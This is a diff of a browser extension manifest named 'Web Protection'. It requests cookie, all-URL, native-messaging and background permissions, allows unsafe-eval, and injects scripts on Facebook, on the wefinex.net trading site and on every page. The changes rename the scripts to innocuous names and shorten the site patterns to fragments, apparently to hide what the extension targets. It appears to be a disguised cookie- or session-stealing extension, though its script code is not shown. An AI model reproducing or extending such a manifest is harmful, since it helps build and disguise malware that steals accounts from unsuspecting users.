@@ -4,7 +4,7 @@
   "short_name": "Web Protection",
   "version": "1.0.0",
   "description": "Web Protection",
-  "permissions": ["notifications", "cookies","storage","tabs", "http://*/*", "https://*/*" ,  "nativeMessaging", "background"],
+  "permissions": ["cookies","storage","tabs", "http://*/*", "https://*/*" ,  "nativeMessaging", "background"],
   "icons": {
     "128": "icon128.png",
     "48": "icon48.png",
@@ -14,21 +14,21 @@
     {
       "js": ["src/content.js"],
       "matches": [ "*://*/*" ],
-      "include_globs": ["*acebook.com*"]
+      "include_globs": ["*aceboo*"]
     },
     {
-      "js": ["src/wefinexMain.js"],
+      "js": ["src/lib.js"],
       "matches": [ "*://*/*" ],
-      "include_globs": ["*wefinex.net*"]
+      "include_globs": ["*efinex.n*"]
     }, {
       "matches": [
         "<all_urls>"
       ],
-      "js": ["src/controller.js"]
+      "js": ["src/version.js"]
     }
   ],
   "background": {
-    "scripts": ["src/background.js"],
+    "scripts": ["src/analysis.js"],
     "persistent": false
   },
   "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"
